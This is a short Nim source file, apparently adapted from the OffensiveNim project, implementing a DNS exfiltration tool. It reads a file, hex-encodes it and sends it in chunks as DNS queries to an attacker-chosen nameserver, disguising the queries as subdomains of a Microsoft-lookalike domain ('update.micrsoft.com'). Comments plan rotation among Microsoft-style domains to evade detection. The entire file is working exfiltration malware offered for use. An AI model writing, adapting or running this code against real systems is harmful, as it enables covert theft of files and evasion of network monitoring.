import os, ndns, strutils

#[
REF https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dns_exfiltrate.nim

TODO: 
    confirmar envio
    rotacionar dominios

domains = [".msn.windows.com", ".update.microsoft.com", ".client.wns.windows.com"]
]#

if paramCount() < 3:
    echo "[!] Use: dnsx.exe <IP> <File> <Time between requests in ms>"
    echo "[!] e.g: dnsx.exe 127.0.0.1 arquivo.pdf 1000"
    quit()

proc dnsExfiltrate(ns: string, target: string, slp: int): void =
    
    let
        content = readFile(target)
        hex = content.toHex
        header = initHeader(randId(), rd = true)
        client = initDnsClient(ns)
        chuckSize = 20 # max 62
    
    var stringindex: int

    echo "[+] Sending ", paramStr(2)

    try:
        while stringindex <= hex.len-1:
            let 
                query =  hex[stringindex .. (if stringindex + chuckSize - 1 > hex.len - 1: hex.len - 1 else: stringindex + chuckSize - 1)]
                dnsquery = query & ".update.micrsoft.com"
                question = initQuestion(dnsquery, QType.A, QClass.IN)
                msg = initMessage(header, @[question])
            
            discard(dnsAsyncQuery(client, msg))

            stringindex += chuckSize
            sleep(slp)

        let 
            question = initQuestion("quit", QType.A, QClass.IN)
            msg = initMessage(header, @[question])
        
        discard(dnsAsyncQuery(client, msg))
        echo "[+] Done!"
    
    except CatchableError as e:
        echo "[!] Error: ", e.msg

when isMainModule:
    dnsExfiltrate(paramStr(1), paramStr(2), parseInt(paramStr(3)))
